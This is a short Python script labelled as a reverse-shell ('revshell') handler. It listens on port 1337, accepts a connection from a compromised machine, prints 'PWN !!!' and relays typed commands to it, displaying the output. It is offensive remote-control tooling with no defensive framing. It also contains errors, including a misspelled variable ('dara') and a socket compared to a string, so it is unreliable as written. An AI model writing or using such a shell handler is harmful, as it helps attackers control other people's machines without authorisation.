# Simple python revshell
import socket, os
ip = "" # enter ip
port = 1337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
s.listen()
while True:
  data, addr = s.accept()
  data.settimeout(2)
  if data != "":
    print("Connected by ",addr)
    os.system("cls")
    print("PWN !!! on port", port)
    print("Shell exploit...................")
    while True:
     try:
      path = data.recv(1024).decode("utf-8")
      cmd = input(f"{path}>")
      if cmd == 'exit':
        data.close()
        s.close()
        exit()
      data.send(cmd.encode("utf-8"))
      output = dara.recv(4096).decode("utf-8")
      print(output)
    except:
      pass
